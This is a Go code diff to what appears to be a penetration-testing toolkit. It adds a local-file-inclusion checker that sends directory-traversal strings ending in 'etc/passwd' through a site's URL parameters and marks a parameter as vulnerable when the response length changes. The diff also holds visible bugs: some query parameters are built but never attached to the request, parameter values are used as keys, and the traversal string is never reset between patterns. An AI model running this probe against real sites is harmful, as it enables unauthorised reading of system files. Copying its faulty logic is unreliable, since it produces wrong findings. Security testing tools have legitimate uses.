@@ -13,6 +13,67 @@ import (
 	"github.com/thomas-osgood/OGOR/misc/generators"
 )
 
+// function designed to check an individual URL parameter for
+// an LFI/Directory Traversal vulnerability.
+func (l *LFIChecker) CheckParameter(param string) (err error) {
+	var bodycontent []byte
+	var bodylen int
+	var detected bool = false
+	var params url.Values = url.Values{}
+	var req *http.Request
+	var resp *http.Response
+	var targetfile string = "etc/passwd"
+	var targeturl string = fmt.Sprintf("%s/%s", l.Checker.baseurl, l.GoodRoute)
+	const traverselen int = 10
+	var traversestr string = ""
+
+	for _, bypass := range lfipatterns {
+		for i := 0; i < traverselen; i++ {
+			traversestr = fmt.Sprintf("%s%s", traversestr, bypass)
+		}
+
+		params.Set(param, fmt.Sprintf("%s%s", traversestr, targetfile))
+
+		req, err = http.NewRequest(http.MethodGet, targeturl, nil)
+		if err != nil {
+			return err
+		}
+
+		req.URL.RawQuery = params.Encode()
+
+		resp, err = l.Checker.client.Do(req)
+		if err != nil {
+			return err
+		}
+		defer resp.Body.Close()
+
+		if resp.StatusCode >= 400 {
+			return errors.New(fmt.Sprintf("bad status code with \"%s\" (%s)", param, resp.Status))
+		}
+
+		bodycontent, err = ioutil.ReadAll(resp.Body)
+		if err != nil {
+			return err
+		}
+
+		bodylen = len(bodycontent)
+
+		if (bodylen == l.BadLength) || (bodylen == l.GoodLength) {
+			continue
+		}
+
+		l.VulnerableParams[param] = bypass
+		detected = true
+		break
+	}
+
+	if !detected {
+		return errors.New(fmt.Sprintf("lfi not detected in \"%s\"", param))
+	}
+
+	return nil
+}
+
 // function designed to check for an LFI signature using the current
 // LFIChecker configuration. this will compare the various lengths and
 // attempt to determine if LFI is present on the target. if no LFI
@@ -85,6 +146,38 @@ func (l *LFIChecker) CheckSignatureWithParams() (err error) {
 		return errors.New("no parameters to check")
 	}
 
+	// set the good length variable to check.
+	err = l.GetGoodLength()
+	if err != nil {
+		return err
+	}
+
+	// set the bad length variable to check.
+	err = l.GetBadLength()
+	if err != nil {
+		return err
+	}
+
+	// set the blank length variable to check.
+	err = l.GetBlankLength()
+	if err != nil {
+		return err
+	}
+
+	for k := range l.Options.Parameters {
+		if (l.GoodLength == l.BadLengthParams[k]) || (l.GoodLength == l.BlankLength[k]) {
+			continue
+		}
+
+		if err = l.CheckParameter(k); err != nil {
+			continue
+		}
+	}
+
+	if len(l.VulnerableParams) < 1 {
+		return errors.New("no vulnerable parameters discovered")
+	}
+
 	return nil
 }
 
@@ -128,6 +221,65 @@ func (l *LFIChecker) GetBadLength() (err error) {
 	return nil
 }
 
+// function designed to check for the return length when a bad parameter
+// value is passed in.
+func (l *LFIChecker) GetBadLengthParams() (err error) {
+	var bodycontent []byte
+	var bodylen int
+	var randval string
+	var req *http.Request
+	var resp *http.Response
+	var targeturl string = fmt.Sprintf("%s/%s", l.Checker.baseurl, l.GoodRoute)
+	var params url.Values = url.Values{}
+
+	if len(l.Options.Parameters) < 1 {
+		return errors.New("no parameters to test")
+	}
+
+	randval, err = generators.GenRandomName(generators.DEFAULT_RAND_MIN, generators.DEFAULT_RAND_MAX)
+	if err != nil {
+		return err
+	}
+
+	// setup HTTP request to target.
+	req, err = http.NewRequest(http.MethodGet, targeturl, nil)
+	if err != nil {
+		return err
+	}
+
+	// loop through given parameters and record the bad return length of each.
+	for curkey := range l.Options.Parameters {
+		for k, v := range l.Options.Parameters {
+			params.Set(k, v)
+		}
+
+		params.Set(l.Options.Parameters[curkey], randval)
+
+		// make request to target.
+		resp, err = l.Checker.client.Do(req)
+		if err != nil {
+			return err
+		}
+		defer resp.Body.Close()
+
+		// read HTTP response.
+		//
+		// note, this does not check the return code because some sites
+		// do not return 404 Not Found when responding with an error message.
+		bodycontent, err = ioutil.ReadAll(resp.Body)
+		if err != nil {
+			return err
+		}
+		// get response length.
+		bodylen = len(bodycontent)
+
+		// set BadLength variable.
+		l.BadLengthParams[curkey] = bodylen
+	}
+
+	return nil
+}
+
 // function designed to get the return length when a blank parameter is passed
 // to the target.
 func (l *LFIChecker) GetBlankLength() (err error) {
@@ -148,37 +300,39 @@ func (l *LFIChecker) GetBlankLength() (err error) {
 		return err
 	}
 
-	for k, v := range l.Options.Parameters {
-		params.Set(k, v)
+	for curkey := range l.Options.Parameters {
+		for k, v := range l.Options.Parameters {
+			params.Set(k, v)
+		}
+
+		keys := make([]string, 0, len(l.Options.Parameters))
+		for k := range l.Options.Parameters {
+			keys = append(keys, k)
+		}
+
+		params.Set(l.Options.Parameters[curkey], "")
+
+		// make request to target.
+		resp, err = l.Checker.client.Do(req)
+		if err != nil {
+			return err
+		}
+		defer resp.Body.Close()
+
+		// read HTTP response.
+		//
+		// note, this does not check the return code because some sites
+		// do not return 404 Not Found when responding with an error message.
+		bodycontent, err = ioutil.ReadAll(resp.Body)
+		if err != nil {
+			return err
+		}
+		// get response length.
+		bodylen = len(bodycontent)
+
+		// set BadLength variable.
+		l.BlankLength[curkey] = bodylen
 	}
-
-	keys := make([]string, 0, len(l.Options.Parameters))
-	for k := range l.Options.Parameters {
-		keys = append(keys, k)
-	}
-
-	params.Set(l.Options.Parameters[keys[0]], "")
-
-	// make request to target.
-	resp, err = l.Checker.client.Do(req)
-	if err != nil {
-		return err
-	}
-	defer resp.Body.Close()
-
-	// read HTTP response.
-	//
-	// note, this does not check the return code because some sites
-	// do not return 404 Not Found when responding with an error message.
-	bodycontent, err = ioutil.ReadAll(resp.Body)
-	if err != nil {
-		return err
-	}
-	// get response length.
-	bodylen = len(bodycontent)
-
-	// set BadLength variable.
-	l.BlankLength = bodylen
 
 	return nil
 }
@@ -217,6 +371,17 @@ func (l *LFIChecker) GetGoodLength() (err error) {
 	req, err = http.NewRequest(http.MethodGet, targeturl, nil)
 	if err != nil {
 		return err
+	}
+
+	// if user specified URL parameters, add them to the request.
+	if len(l.Options.Parameters) > 0 {
+		var params url.Values = url.Values{}
+
+		for k, v := range l.Options.Parameters {
+			params.Set(k, v)
+		}
+
+		req.URL.RawQuery = params.Encode()
 	}
 
 	// make request to target.
